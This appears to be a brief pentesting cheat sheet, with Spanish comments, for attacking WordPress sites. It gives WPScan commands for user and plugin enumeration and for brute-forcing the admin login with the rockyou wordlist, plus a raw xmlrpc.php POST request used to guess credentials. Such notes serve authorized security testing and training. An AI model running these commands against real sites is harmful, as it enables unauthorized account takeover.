# WPScan

### Use

```bash
wpscan --url https://WEB.com
```

### Enumeration

#### Users & Plugins

```bash
wpscan --url https://WEB.com --enumerate u,p
```

> usuarios validos potenciales existentes

### Brute Force

```bash
wpscan --url https://WEB.com -U admin -P /usr/share/wordlist/rockyou.txt
```

> Ataque de fuerza bruta en el panel de autenticación para descubrir credenciales validas.
>
> Este procedimiento también se pude hacer de forma manual con un script de Bash o Python.

***

### XMLRPC

Seria necesario también una petición POST al archivo xmlrpc.php con estructura XML

```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

Referencia ; Exploit : [https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions)
